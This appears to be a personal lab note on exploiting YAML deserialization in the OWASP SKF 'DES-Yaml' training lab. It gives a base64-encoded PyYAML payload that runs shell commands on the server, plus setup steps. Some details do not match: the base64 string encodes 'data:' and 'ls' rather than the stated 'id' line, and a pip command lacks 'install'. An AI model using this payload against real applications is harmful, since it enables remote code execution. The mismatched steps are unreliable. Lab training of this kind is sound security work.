---
tags:
  - vulnerabilty
  - "#deserializationYAML"
  - python
---
# What is Des-YAML?


---

# Exploiting

![](../../Images/Pasted%20image%2020230906193315.png)

If you look at the URL you see something like that:

> http://localhost:5000/information/eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ==

This is a string in base64

If we decode we can see this:

![](../../Images/Pasted%20image%2020230906193547.png)

Mmm, we can try to change the data:

````bash
echo -n "yaml: Hello my nickname is sergiky" | base64
````

You can put this information in the URL

And see this:

![](../../Images/Pasted%20image%2020230906193803.png)

You can see the source code in **DES.py** file

And we don't see any type of validation or sanitization

If there are not validation we can create a special structure that when is serialized and deserealized allow to execute commands  

In the page of [Peter Murphy](https://www.pkmurphy.com.au/isityaml/) have a sentence that we are going to use to try to inject command

````yaml
!!python/object/apply:subprocess.check_output ['ls']
````

We are going to introduce this in a file named data:

````bash
yaml: !!python/object/apply:subprocess.check_output ['id']
````

We represent this in base64

````bash
cat data | base64 -w 0;
````

`-w 0` --> To compact all in one line
`echo` --> If you see a hashtag you can put it, this is because there isn't a jump line

````bash
ZGF0YTogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IFsnbHMnXQo=
````

Now put this base64 string in the URL and you have the **results**

![](../../Images/Pasted%20image%2020230906195927.png)


---

# Labs

[https://github.com/blabla1337/skf-labs/tree/master/python/DES-Yaml](https://github.com/blabla1337/skf-labs/tree/master/python/DES-Yaml)

You probably have problems with python2.7 and you're not going to see until execute the injection, you have another form that is using docker

## Using python

To execute this you have to use python2.7

````bash
python2.7 DES.py
````

If you have an error with the module yaml install them with pip:

````bash
pip2 pyyaml
````

## Using docker

> sudo docker pull blabla1337/owasp-skf-lab:des-yaml

and then

> sudo docker run -dit -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:des-yaml

